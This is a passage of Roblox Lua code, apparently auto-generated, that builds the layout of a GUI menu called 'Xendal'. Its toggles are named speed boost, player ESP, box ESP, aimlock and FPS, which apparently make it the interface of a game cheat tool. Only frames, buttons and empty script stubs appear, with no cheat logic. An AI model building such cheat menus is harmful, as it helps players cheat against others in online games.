G2L["1ff"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1ff"]["BackgroundTransparency"] = 1;
G2L["1ff"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["1ff"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1ff"]["Text"] = [[]];
G2L["1ff"]["Name"] = [[Button]];
G2L["1ff"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle.Holder.Button.LocalScript
G2L["200"] = Instance.new("LocalScript", G2L["1ff"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle.Holder.UIPadding
G2L["201"] = Instance.new("UIPadding", G2L["1fa"]);
G2L["201"]["PaddingTop"] = UDim.new(0, 4);
G2L["201"]["PaddingRight"] = UDim.new(0, 4);
G2L["201"]["PaddingLeft"] = UDim.new(0, 4);
G2L["201"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle.Holder.UICorner
G2L["202"] = Instance.new("UICorner", G2L["1fa"]);
G2L["202"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle
G2L["203"] = Instance.new("Frame", G2L["1bb"]);
G2L["203"]["BorderSizePixel"] = 0;
G2L["203"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["203"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["203"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["203"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["203"]["Name"] = [[EspPlayerToggle]];
G2L["203"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle.Main Handler
G2L["204"] = Instance.new("LocalScript", G2L["203"]);
G2L["204"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle.Holder
G2L["205"] = Instance.new("Frame", G2L["203"]);
G2L["205"]["ZIndex"] = 2;
G2L["205"]["BorderSizePixel"] = 0;
G2L["205"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["205"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["205"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["205"]["Position"] = UDim2.new(0.459, 0, -2.57333, -2);
G2L["205"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["205"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle.Holder.Circle
G2L["206"] = Instance.new("Frame", G2L["205"]);
G2L["206"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["206"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["206"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["206"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["206"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["206"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle.Holder.Circle.Mini
G2L["207"] = Instance.new("Frame", G2L["206"]);
G2L["207"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["207"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["207"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["207"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["207"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["207"]["Name"] = [[Mini]];
G2L["207"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle.Holder.Circle.Mini.UICorner
G2L["208"] = Instance.new("UICorner", G2L["207"]);
G2L["208"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle.Holder.Circle.UICorner
G2L["209"] = Instance.new("UICorner", G2L["206"]);
G2L["209"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle.Holder.Button
G2L["20a"] = Instance.new("TextButton", G2L["205"]);
G2L["20a"]["BorderSizePixel"] = 0;
G2L["20a"]["TextSize"] = 14;
G2L["20a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["20a"]["BackgroundTransparency"] = 1;
G2L["20a"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["20a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["20a"]["Text"] = [[]];
G2L["20a"]["Name"] = [[Button]];
G2L["20a"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle.Holder.Button.LocalScript
G2L["20b"] = Instance.new("LocalScript", G2L["20a"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle.Holder.UIPadding
G2L["20c"] = Instance.new("UIPadding", G2L["205"]);
G2L["20c"]["PaddingTop"] = UDim.new(0, 4);
G2L["20c"]["PaddingRight"] = UDim.new(0, 4);
G2L["20c"]["PaddingLeft"] = UDim.new(0, 4);
G2L["20c"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle.Holder.UICorner
G2L["20d"] = Instance.new("UICorner", G2L["205"]);
G2L["20d"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle
G2L["20e"] = Instance.new("Frame", G2L["1bb"]);
G2L["20e"]["BorderSizePixel"] = 0;
G2L["20e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20e"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["20e"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["20e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20e"]["Name"] = [[PingToggle]];
G2L["20e"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle.Main Handler
G2L["20f"] = Instance.new("LocalScript", G2L["20e"]);
G2L["20f"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle.Holder
G2L["210"] = Instance.new("Frame", G2L["20e"]);
G2L["210"]["ZIndex"] = 2;
G2L["210"]["BorderSizePixel"] = 0;
G2L["210"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["210"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["210"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["210"]["Position"] = UDim2.new(0.459, 0, -1.36, -2);
G2L["210"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["210"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle.Holder.Circle
G2L["211"] = Instance.new("Frame", G2L["210"]);
G2L["211"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["211"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["211"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["211"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["211"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["211"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle.Holder.Circle.Mini
G2L["212"] = Instance.new("Frame", G2L["211"]);
G2L["212"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["212"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["212"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["212"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["212"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["212"]["Name"] = [[Mini]];
G2L["212"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle.Holder.Circle.Mini.UICorner
G2L["213"] = Instance.new("UICorner", G2L["212"]);
G2L["213"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle.Holder.Circle.UICorner
G2L["214"] = Instance.new("UICorner", G2L["211"]);
G2L["214"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle.Holder.Button
G2L["215"] = Instance.new("TextButton", G2L["210"]);
G2L["215"]["BorderSizePixel"] = 0;
G2L["215"]["TextSize"] = 14;
G2L["215"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["215"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["215"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["215"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["215"]["BackgroundTransparency"] = 1;
G2L["215"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["215"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["215"]["Text"] = [[]];
G2L["215"]["Name"] = [[Button]];
G2L["215"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle.Holder.Button.LocalScript
G2L["216"] = Instance.new("LocalScript", G2L["215"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle.Holder.UIPadding
G2L["217"] = Instance.new("UIPadding", G2L["210"]);
G2L["217"]["PaddingTop"] = UDim.new(0, 4);
G2L["217"]["PaddingRight"] = UDim.new(0, 4);
G2L["217"]["PaddingLeft"] = UDim.new(0, 4);
G2L["217"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle.Holder.UICorner
G2L["218"] = Instance.new("UICorner", G2L["210"]);
G2L["218"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle
G2L["219"] = Instance.new("Frame", G2L["1bb"]);
G2L["219"]["BorderSizePixel"] = 0;
G2L["219"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["219"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["219"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["219"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["219"]["Name"] = [[EspBoxToggle]];
G2L["219"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle.Main Handler
G2L["21a"] = Instance.new("LocalScript", G2L["219"]);
G2L["21a"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle.Holder
G2L["21b"] = Instance.new("Frame", G2L["219"]);
G2L["21b"]["ZIndex"] = 2;
G2L["21b"]["BorderSizePixel"] = 0;
G2L["21b"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["21b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["21b"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["21b"]["Position"] = UDim2.new(0.459, 0, -3.2, -2);
G2L["21b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["21b"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle.Holder.Circle
G2L["21c"] = Instance.new("Frame", G2L["21b"]);
G2L["21c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21c"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["21c"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["21c"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["21c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["21c"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle.Holder.Circle.Mini
G2L["21d"] = Instance.new("Frame", G2L["21c"]);
G2L["21d"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["21d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["21d"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["21d"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["21d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["21d"]["Name"] = [[Mini]];
G2L["21d"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle.Holder.Circle.Mini.UICorner
G2L["21e"] = Instance.new("UICorner", G2L["21d"]);
G2L["21e"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle.Holder.Circle.UICorner
G2L["21f"] = Instance.new("UICorner", G2L["21c"]);
G2L["21f"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle.Holder.Button
G2L["220"] = Instance.new("TextButton", G2L["21b"]);
G2L["220"]["BorderSizePixel"] = 0;
G2L["220"]["TextSize"] = 14;
G2L["220"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["220"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["220"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["220"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["220"]["BackgroundTransparency"] = 1;
G2L["220"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["220"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["220"]["Text"] = [[]];
G2L["220"]["Name"] = [[Button]];
G2L["220"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle.Holder.Button.LocalScript
G2L["221"] = Instance.new("LocalScript", G2L["220"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle.Holder.UIPadding
G2L["222"] = Instance.new("UIPadding", G2L["21b"]);
G2L["222"]["PaddingTop"] = UDim.new(0, 4);
G2L["222"]["PaddingRight"] = UDim.new(0, 4);
G2L["222"]["PaddingLeft"] = UDim.new(0, 4);
G2L["222"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle.Holder.UICorner
G2L["223"] = Instance.new("UICorner", G2L["21b"]);
G2L["223"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle
G2L["224"] = Instance.new("Frame", G2L["1bb"]);
G2L["224"]["BorderSizePixel"] = 0;
G2L["224"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["224"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["224"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["224"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["224"]["Name"] = [[NoflymeduseToggle]];
G2L["224"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle.Main Handler
G2L["225"] = Instance.new("LocalScript", G2L["224"]);
G2L["225"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle.Holder
G2L["226"] = Instance.new("Frame", G2L["224"]);
G2L["226"]["ZIndex"] = 2;
G2L["226"]["BorderSizePixel"] = 0;
G2L["226"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["226"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["226"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["226"]["Position"] = UDim2.new(0.459, 0, -1.96, -2);
G2L["226"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["226"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle.Holder.Circle
G2L["227"] = Instance.new("Frame", G2L["226"]);
G2L["227"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["227"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["227"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["227"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["227"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["227"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle.Holder.Circle.Mini
G2L["228"] = Instance.new("Frame", G2L["227"]);
G2L["228"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["228"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["228"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["228"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["228"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["228"]["Name"] = [[Mini]];
G2L["228"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle.Holder.Circle.Mini.UICorner
G2L["229"] = Instance.new("UICorner", G2L["228"]);
G2L["229"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle.Holder.Circle.UICorner
G2L["22a"] = Instance.new("UICorner", G2L["227"]);
G2L["22a"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle.Holder.Button
G2L["22b"] = Instance.new("TextButton", G2L["226"]);
G2L["22b"]["BorderSizePixel"] = 0;
G2L["22b"]["TextSize"] = 14;
G2L["22b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["22b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["22b"]["BackgroundTransparency"] = 1;
G2L["22b"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["22b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["22b"]["Text"] = [[]];
G2L["22b"]["Name"] = [[Button]];
G2L["22b"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle.Holder.Button.LocalScript
G2L["22c"] = Instance.new("LocalScript", G2L["22b"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle.Holder.UIPadding
G2L["22d"] = Instance.new("UIPadding", G2L["226"]);
G2L["22d"]["PaddingTop"] = UDim.new(0, 4);
G2L["22d"]["PaddingRight"] = UDim.new(0, 4);
G2L["22d"]["PaddingLeft"] = UDim.new(0, 4);
G2L["22d"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle.Holder.UICorner
G2L["22e"] = Instance.new("UICorner", G2L["226"]);
G2L["22e"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle
G2L["22f"] = Instance.new("Frame", G2L["1bb"]);
G2L["22f"]["BorderSizePixel"] = 0;
G2L["22f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22f"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["22f"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["22f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22f"]["Name"] = [[FpsToggle]];
G2L["22f"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle.Main Handler
G2L["230"] = Instance.new("LocalScript", G2L["22f"]);
G2L["230"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle.Holder
G2L["231"] = Instance.new("Frame", G2L["22f"]);
G2L["231"]["ZIndex"] = 2;
G2L["231"]["BorderSizePixel"] = 0;
G2L["231"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["231"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["231"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["231"]["Position"] = UDim2.new(0.459, 0, -0.74667, -2);
G2L["231"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["231"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle.Holder.Circle
G2L["232"] = Instance.new("Frame", G2L["231"]);
G2L["232"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["232"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["232"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["232"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["232"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["232"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle.Holder.Circle.Mini
G2L["233"] = Instance.new("Frame", G2L["232"]);
G2L["233"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["233"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["233"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["233"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["233"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["233"]["Name"] = [[Mini]];
G2L["233"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle.Holder.Circle.Mini.UICorner
G2L["234"] = Instance.new("UICorner", G2L["233"]);
G2L["234"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle.Holder.Circle.UICorner
G2L["235"] = Instance.new("UICorner", G2L["232"]);
G2L["235"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle.Holder.Button
G2L["236"] = Instance.new("TextButton", G2L["231"]);
G2L["236"]["BorderSizePixel"] = 0;
G2L["236"]["TextSize"] = 14;
G2L["236"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["236"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["236"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["236"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["236"]["BackgroundTransparency"] = 1;
G2L["236"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["236"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["236"]["Text"] = [[]];
G2L["236"]["Name"] = [[Button]];
G2L["236"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle.Holder.Button.LocalScript
G2L["237"] = Instance.new("LocalScript", G2L["236"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle.Holder.UIPadding
G2L["238"] = Instance.new("UIPadding", G2L["231"]);
G2L["238"]["PaddingTop"] = UDim.new(0, 4);
G2L["238"]["PaddingRight"] = UDim.new(0, 4);
G2L["238"]["PaddingLeft"] = UDim.new(0, 4);
G2L["238"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle.Holder.UICorner
G2L["239"] = Instance.new("UICorner", G2L["231"]);
G2L["239"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle
G2L["23a"] = Instance.new("Frame", G2L["1bb"]);
G2L["23a"]["BorderSizePixel"] = 0;
G2L["23a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23a"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["23a"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["23a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23a"]["Name"] = [[AimlockToggle]];
G2L["23a"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle.Main Handler
G2L["23b"] = Instance.new("LocalScript", G2L["23a"]);
G2L["23b"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle.Holder
G2L["23c"] = Instance.new("Frame", G2L["23a"]);
G2L["23c"]["ZIndex"] = 2;
G2L["23c"]["BorderSizePixel"] = 0;
G2L["23c"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["23c"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["23c"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["23c"]["Position"] = UDim2.new(0.459, 0, -0.14667, -2);
G2L["23c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["23c"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle.Holder.Circle
G2L["23d"] = Instance.new("Frame", G2L["23c"]);
G2L["23d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23d"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["23d"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["23d"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["23d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["23d"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle.Holder.Circle.Mini
G2L["23e"] = Instance.new("Frame", G2L["23d"]);
G2L["23e"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["23e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["23e"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["23e"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["23e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["23e"]["Name"] = [[Mini]];
G2L["23e"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle.Holder.Circle.Mini.UICorner
G2L["23f"] = Instance.new("UICorner", G2L["23e"]);
G2L["23f"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle.Holder.Circle.UICorner
G2L["240"] = Instance.new("UICorner", G2L["23d"]);
G2L["240"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle.Holder.Button
G2L["241"] = Instance.new("TextButton", G2L["23c"]);
G2L["241"]["BorderSizePixel"] = 0;
